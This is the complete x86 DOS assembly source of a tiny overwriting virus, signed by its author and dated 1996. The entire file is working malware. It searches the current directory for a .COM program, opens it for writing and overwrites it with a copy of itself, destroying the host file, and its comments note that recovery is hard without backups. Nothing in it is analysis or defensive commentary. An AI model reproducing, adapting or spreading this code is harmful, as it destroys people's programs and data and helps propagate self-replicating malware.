;AuVS.tiny.OVERWRITING.0001
;My 1st VIRUS!!!!!!!!!!!!!!
;This is an extremely simple overwriting, tiny virus, that is easy to 
;detect, but there's not much to do to clean it if you have no backups
;F-PROT detects this as an unknown TRIVIAL variant
START:
	mov ah,4Eh              ;Find first *.COM file in current dir
	lea dx,OFFSET MASK      ;*.COM
	xor cx,cx               ;xero out da register
	int 21h                 ;find
	mov dx,009Eh            ;file handle
	mov ax,3D01h            ;open file for writing
	int 21h                 ;do it
	mov bx,ax               ;put handle in bx
	mov ah,40h              ;write to file
	mov cx,END - START      ;find size of file even if modified
	lea dx,OFFSET START     ;the START
	int 21h                 ;WRITE IT, DAMN IT!!
	int 20h                 ;END IT ALL
Mask            db      '*.COM',0
Copyright       db      'Copyright `96, KALiPORNiA'
VirusName       db      'AuVS.TINY.OVERWRITING.0001'
END:
